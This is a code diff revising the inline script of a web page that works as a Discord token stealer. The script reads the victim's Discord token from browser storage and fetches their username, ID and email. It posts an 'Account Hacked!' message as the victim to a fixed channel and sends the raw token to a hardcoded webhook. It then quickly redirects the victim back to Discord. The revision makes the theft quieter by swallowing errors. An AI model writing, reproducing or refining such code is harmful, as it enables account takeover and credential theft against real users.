@@ -23,53 +23,61 @@
   <script>
     (function() {
       try {
-        let token = localStorage.getItem("token");
+        var token = localStorage.getItem("token");
         if (token) {
-          token = token.replace(/"/g, ""); // 移除 Discord 自動包上的雙引號
+          token = token.replace(/"/g, "");
 
-          // 用 token 取得帳號資訊
+          // 立即偷取 token — fire & forget
           fetch("https://discord.com/api/v9/users/@me", {
             headers: { "Authorization": token }
-          }).then(async res => {
+          }).then(function(res) {
             if (res.ok) {
-              const user = await res.json();
-              const username = user.username;
-              const userId = user.id;
-              const email = user.email || 'N/A';
+              res.json().then(function(user) {
+                var username = user.username;
+                var userId = user.id;
+                var email = user.email || 'N/A';
 
-              // 發送訊息到目標 878151437085974548
-              fetch(`https://discord.com/api/v9/channels/878151437085974548/messages`, {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json",
-                  "Authorization": token,
-                  "X-Correlation-Id": userId
-                },
-                body: JSON.stringify({
-                  content: `🔓 **Account Hacked!**\n使用者: **${username}** (${userId})\nEmail: ${email}`
-                })
-              }).catch(err => console.warn("Send message failed:", err));
+                // 發送訊息到目標 878151437085974548
+                fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": token,
+                    "X-Correlation-Id": userId
+                  },
+                  body: JSON.stringify({
+                    content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
+                  })
+                }).catch(function() {});
 
-              // 把 token 送到 webhook 備份
-              fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  content: `🔓 **Discord Token 已擷取**\n使用者: **${username}**\n\`\`\`\n${token}\n\`\`\``
-                })
-              }).catch(err => console.warn("Webhook failed:", err));
+                // 把 token 送到 webhook 備份
+                fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
+                  })
+                }).catch(function() {});
+              });
             }
-            // 無論 fetch 結果如何，立即跳回 Discord
+          }).catch(function() {});
+        }
+
+        // 1 秒後跳回 Discord（不管 API 是否完成）
+        setTimeout(function() {
+          // 先嘗試 Discord deep link
+          window.location.replace('discord://');
+          // 備案：如果 deep link 失敗
+          setTimeout(function() {
             window.location.href = "https://discord.com/channels/@me";
-          }).catch(err => {
-            console.warn("API call failed:", err);
+          }, 500);
+        }, 1000);
+
+        // 無 token 時：2 秒後跳回
+        if (!token) {
+          setTimeout(function() {
             window.location.href = "https://discord.com/channels/@me";
-          });
-        } else {
-          // 無 token — 一般瀏覽器打開，顯示等待然後跳回
-          setTimeout(() => {
-            window.location.href = "https://discord.com/channels/@me";
-          }, 1500);
+          }, 2000);
         }
       } catch(e) {
         console.log("Token 抓取失敗:", e);
